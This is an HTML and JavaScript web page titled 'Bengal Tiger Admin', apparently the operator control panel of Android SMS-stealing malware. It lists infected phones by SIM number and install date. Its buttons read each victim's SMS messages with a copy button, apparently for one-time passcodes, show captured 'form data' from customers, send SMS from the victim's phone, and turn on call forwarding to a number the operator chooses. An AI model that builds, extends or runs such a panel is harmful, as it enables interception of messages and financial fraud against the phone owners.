<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bengal Tiger Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #FFD700; --dark: #111; --success: #28a745; --danger: #dc3545; }
        body { margin: 0; font-family: 'Roboto', sans-serif; background: #f0f2f5; }
        #toast { visibility: hidden; min-width: 250px; background-color: var(--success); color: #fff; text-align: center; border-radius: 5px; padding: 16px; position: fixed; z-index: 3000; right: 30px; top: 30px; font-weight: bold; opacity: 0; transition: 0.5s; }
        #toast.show { visibility: visible; opacity: 1; top: 60px; }
        #toast.error { background-color: var(--danger); }
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); z-index: 2000; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .login-box { background: white; padding: 40px; border-radius: 8px; text-align: center; width: 300px; }
        .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        .btn-gold { background: var(--primary); border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; color: var(--dark); }
        header { background: var(--dark); color: var(--primary); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .controls i { margin-left: 20px; cursor: pointer; font-size: 20px; color: white; transition: 0.3s; }
        .controls i:hover { color: var(--primary); }
        .stats { display: flex; justify-content: space-around; padding: 20px; margin-top: 20px; }
        .stat-box { background: white; width: 30%; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-bottom: 4px solid var(--dark); }
        .stat-num { font-size: 32px; font-weight: bold; color: var(--dark); }
        .filters { text-align: center; margin: 20px; }
        .filter-btn { padding: 10px 20px; margin: 0 5px; background: #ddd; border: none; cursor: pointer; border-radius: 20px; font-weight: bold; }
        .filter-btn.active { background: var(--dark); color: var(--primary); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #555; position: relative; }
        .card.online { border-top: 5px solid var(--success); }
        .card.pinned { border-top: 5px solid var(--primary); }
        .info { font-size: 13px; color: #444; margin-bottom: 5px; }
        .btns { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-top: 15px; }
        .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
        .btn-sms { background: var(--success); }
        .btn-call { background: #17a2b8; }
        .btn-view { background: #9c27b0; }
        .btn-del { background: var(--danger); }
        .serial-badge { position: absolute; top: 6px; right: 10px; z-index: 3; background: var(--primary); color: var(--dark); font-weight: bold; padding: 5px 12px; border-radius: 50px; font-size: 14px; }
        .modal { display: none; position: fixed; z-index: 2500; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
        .modal.show { display: flex; align-items: center; justify-content: center; }
        .modal-content { background: white; padding: 30px; border-radius: 10px; width: 80%; max-width: 600px; max-height: 80vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h2 { margin: 0; }
        .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .no-data { text-align: center; color: #999; padding: 30px; }
        .cmd-status { margin-top: 10px; padding: 10px; border-radius: 5px; font-weight: bold; display: none; }
    </style>
</head>
<body>
    <div id="toast"><i class="fas fa-check-circle"></i> Success</div>
    <div id="login-screen">
        <h1 style="color:var(--primary)">BENGAL TIGER ADMIN</h1>
        <div class="login-box">
            <input type="password" id="pass" placeholder="Enter Password">
            <button class="btn-gold" onclick="login()">LOGIN</button>
        </div>
    </div>

    <div id="dashboard" style="display:none;">
        <header>
            <h2><i class="fas fa-paw"></i> BENGAL TIGER</h2>
            <div class="controls">
                <i class="fas fa-sync-alt" onclick="fetchData(true)" title="Refresh"></i>
                <i class="fas fa-key" onclick="changePass()" title="Change Password"></i>
                <i class="fas fa-sign-out-alt" onclick="location.reload()" title="Logout"></i>
            </div>
        </header>
        <div class="stats">
            <div class="stat-box"><div class="stat-num" id="s-all">0</div>ALL DEVICES</div>
            <div class="stat-box"><div class="stat-num" id="s-on" style="color:var(--success)">0</div>ONLINE</div>
            <div class="stat-box"><div class="stat-num" id="s-pin" style="color:var(--primary)">0</div>PINNED</div>
        </div>
        <div class="filters">
            <button class="filter-btn active" onclick="filter('all', this)">ALL DEVICES</button>
            <button class="filter-btn" onclick="filter('online', this)">ONLINE</button>
            <button class="filter-btn" onclick="filter('pinned', this)">PINNED</button>
        </div>
        <div class="grid" id="grid"></div>
    </div>

    <div id="viewDataModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modalHeaderTitle">📋 Device Details</h2>
                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
            </div>
            <div id="modalBody"></div>
        </div>
    </div>

    <div id="viewSmsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📬 SMS Messages</h2>
                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
            </div>
            <div id="smsModalBody"></div>
        </div>
    </div>

    <div id="actionModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="actionModalTitle">Action</h2>
                <button class="close-btn" onclick="closeModal('actionModal')">✕ Close</button>
            </div>
            <div id="actionModalBody"></div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        function escapeAttr(str) {
            if (str === undefined || str === null) return '';
            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        }

        const socket = io();
        let devices = [];
        let currentFilter = 'all';

        function toast(msg, err=false) {
            const t = document.getElementById("toast");
            t.innerText = msg;
            t.className = err ? "show error" : "show";
            setTimeout(() => t.className = "", 3000);
        }

        async function login() {
            const p = document.getElementById('pass').value;
            try {
                const r = await fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: 'admin', password: p }) });
                const d = await r.json();
                if (d.success) {
                    document.getElementById('login-screen').style.display='none';
                    document.getElementById('dashboard').style.display='block';
                    fetchData(false);
                } else alert('Wrong Password');
            } catch (err) { toast('Login error', true); }
        }

        async function fetchData(showMsg) {
            try {
                const r = await fetch('/api/devices');
                devices = await r.json();
                render();
                if (showMsg) toast('✅ Refresh Successful!');
            } catch (err) { toast('❌ Refresh failed', true); }
        }

        socket.on('dashboard-update', () => fetchData(false));

        function filter(type, btn) {
            currentFilter = type;
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            render();
        }

        function formatLastSeen(ts) {
            if (!ts) return 'N/A';
            const d = new Date(ts);
            if (isNaN(d.getTime())) return 'N/A';
            const diff = Math.floor((Date.now() - d) / 1000);
            if (diff < 60) return diff + 's ago';
            if (diff < 3600) return Math.floor(diff/60) + 'm ago';
            return d.toLocaleString();
        }

        function render() {
            document.getElementById('s-all').innerText = devices.length;
            document.getElementById('s-on').innerText = devices.filter(d=>d.isOnline).length;
            document.getElementById('s-pin').innerText = devices.filter(d=>d.isPinned).length;
            const grid = document.getElementById('grid');
            grid.innerHTML = '';
            let list = devices.slice();
            if (currentFilter === 'online') list = list.filter(d=>d.isOnline);
            if (currentFilter === 'pinned') list = list.filter(d=>d.isPinned);
            list.sort((a, b) => new Date(b.registrationTimestamp || 0) - new Date(a.registrationTimestamp || 0));

            list.forEach((d, idx) => {
                const serialNum = idx + 1;
                const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 50 ? 'fa-battery-half' : 'fa-battery-quarter';
                const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
                const identifier = d._id || d.deviceId || d.serialNumber;
                const card = document.createElement('div');
                card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
                card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0;position:relative;max-width:320px;margin:auto;border-radius:32px;background:#f8fafc;padding-top:60px;padding-bottom:24px;overflow:hidden;';
                card.innerHTML = `
                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${identifier}', ${!d.isPinned})"></i></div>
                    <div style="position:absolute;top:12px;right:18px;display:flex;align-items:center;gap:4px;"><i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i><span style="font-weight:bold;">${d.battery||0}%</span></div>
                    <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${escapeAttr(d.model||'')}</small></div>
                    <div class="info" style="text-align:center;">${statusBadge}</div>
                    <div class="info"><b>SIM1:</b> ${escapeAttr(d.sim1||'N/A')}</div>
                    <div class="info"><b>SIM2:</b> ${escapeAttr(d.sim2||'N/A')}</div>
                    <div class="info"><b>Last Seen:</b> ${formatLastSeen(d.lastSeen)}</div>
                    <div class="btns">
                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewAction('${identifier}', 'VIEW_DATA')"><i class="fas fa-eye"></i> VIEW DATA</button>
                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewAction('${identifier}', 'VIEW_SMS')"><i class="fas fa-envelope"></i> VIEW SMS</button>
                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewAction('${identifier}', 'VIEW_FORM')"><i class="fas fa-file-alt"></i> FORM DATA</button>
                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${identifier}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${identifier}')"><i class="fas fa-phone"></i> CALL FWD</button>
                        <button class="btn-sm btn-del" onclick="del('${identifier}')"><i class="fas fa-trash"></i> DELETE</button>
                    </div>`;
                grid.appendChild(card);
            });
        }

        async function viewAction(deviceId, action) {
            const modalId = action === 'VIEW_SMS' ? 'viewSmsModal' : 'viewDataModal';
            const bodyId = action === 'VIEW_SMS' ? 'smsModalBody' : 'modalBody';
            const title = action === 'VIEW_DATA' ? '📋 Device Details' : action === 'VIEW_SMS' ? '📬 SMS Messages' : '📝 Form Data';
            
            if (action !== 'VIEW_SMS') document.getElementById('modalHeaderTitle').innerText = title;
            document.getElementById(bodyId).innerHTML = '<div class="no-data">Loading...</div>';
            document.getElementById(modalId).classList.add('show');

            try {
                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action }) });
                const data = await res.json();
                
                if (!data.success) {
                    document.getElementById(bodyId).innerHTML = `<div class="no-data">${data.message}</div>`;
                    return;
                }

                if (action === 'VIEW_DATA') showDeviceData(data.device);
                if (action === 'VIEW_FORM') showFormData(data.customerData);
                if (action === 'VIEW_SMS') showSmsData(data.messages, deviceId);

            } catch (e) { toast('Error fetching data', true); }
        }

        function showDeviceData(d) {
            let html = `<div style="background:#e3f2fd;padding:15px;border-radius:8px;">`;
            const fields = [['Model', d.model], ['Serial', d.serialNumber], ['Android', d.androidVersion], ['SIM 1', d.sim1], ['SIM 2', d.sim2], ['Battery', d.battery + '%'], ['Install Date', d.registrationTimestamp ? new Date(d.registrationTimestamp).toLocaleString() : 'N/A']];
            fields.forEach(f => {
                html += `<div style="display:flex;justify-content:space-between;border-bottom:1px solid #ddd;padding:8px 0;"><b>${f[0]}:</b> <span>${f[1]||'N/A'}</span></div>`;
            });
            html += `</div>`;
            document.getElementById('modalBody').innerHTML = html;
        }

        function showFormData(data) {
            let html = `<h3>Submitted Form Data</h3>`;
            if (!data || Object.keys(data).length === 0) html += `<div class="no-data">No form data found</div>`;
            else {
                Object.entries(data).forEach(([k, v]) => {
                    html += `<div style="background:#fffde7;padding:12px;margin-bottom:8px;border-radius:8px;border-left:5px solid #ff9800;"><b>${escapeAttr(k)}:</b> ${escapeAttr(v)}</div>`;
                });
            }
            document.getElementById('modalBody').innerHTML = html;
        }

        function showSmsData(msgs, deviceId) {
            if (!msgs || msgs.length === 0) {
                document.getElementById('smsModalBody').innerHTML = '<div class="no-data">No SMS found</div>';
                return;
            }
            let html = msgs.map((m, idx) => `
                <div style="background:#fff;padding:10px;margin-bottom:8px;border-radius:8px;border-left:5px solid #1976d2;display:flex;justify-content:space-between;">
                    <div>
                        <div style="color:#1976d2;font-weight:bold;">${idx+1}. From: ${escapeAttr(m.address||m.from)}</div>
                        <div>${escapeAttr(m.body||m.message)}</div>
                        <small style="color:#888;">${formatLastSeen(m.date||m.time)}</small>
                    </div>
                    <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(m.body||m.message)}');toast('Copied')"></i>
                </div>`).join('');
            document.getElementById('smsModalBody').innerHTML = html;
        }

        function showSendSmsModal(deviceId) {
            document.getElementById('actionModalTitle').innerText = 'Send SMS';
            document.getElementById('actionModalBody').innerHTML = `
                <input type="text" id="smsNumber" placeholder="Recipient Number" style="width:90%;padding:10px;margin-bottom:10px;">
                <textarea id="smsText" rows="4" placeholder="Message" style="width:90%;padding:10px;"></textarea>
                <button class="btn-gold" onclick="act('${deviceId}', 'SEND_SMS')" style="width:100%;margin-top:10px;">SEND</button>`;
            document.getElementById('actionModal').classList.add('show');
        }

        function showCallForwardModal(deviceId) {
            document.getElementById('actionModalTitle').innerText = 'Call Forwarding';
            document.getElementById('actionModalBody').innerHTML = `
                <input type="text" id="cfNumber" placeholder="Target Number" style="width:90%;padding:10px;margin-bottom:10px;">
                <button class="btn-sm btn-sms" onclick="act('${deviceId}', 'CALL_FORWARD_ACTIVATE')" style="width:100%;margin-bottom:5px;">ACTIVATE</button>
                <button class="btn-sm btn-del" onclick="act('${deviceId}', 'CALL_FORWARD_DEACTIVATE')" style="width:100%;">DEACTIVATE</button>`;
            document.getElementById('actionModal').classList.add('show');
        }

        async function act(deviceId, action) {
            const data = {};
            if (action === 'SEND_SMS') {
                data.number = document.getElementById('smsNumber').value;
                data.message = document.getElementById('smsText').value;
            }
            if (action === 'CALL_FORWARD_ACTIVATE') data.number = document.getElementById('cfNumber').value;

            try {
                const res = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action, data }) });
                const d = await res.json();
                toast(d.message || (d.success ? 'Command Sent' : 'Error'), !d.success);
                if (d.success) closeModal('actionModal');
            } catch(e) { toast('Error', true); }
        }

        async function togglePin(id, status) {
            await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, status }) });
            fetchData(false);
        }

        function del(deviceId) {
            const p = prompt("Admin Password:");
            if (!p) return;
            fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, password: p }) })
                .then(r => r.json())
                .then(d => {
                    if(d.success) toast('Deleted');
                    else toast(d.message || 'Error', true);
                    fetchData(false);
                });
        }

        function closeModal(id) { document.getElementById(id).classList.remove('show'); }

        async function changePass() {
            const oldP = prompt("Old Password:");
            if(!oldP) return;
            const newP = prompt("New Password:");
            if(!newP) return;
            const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: oldP, newPassword: newP }) });
            const d = await r.json();
            toast(d.success ? 'Success' : d.message, !d.success);
        }
    </script>
</body>
</html>
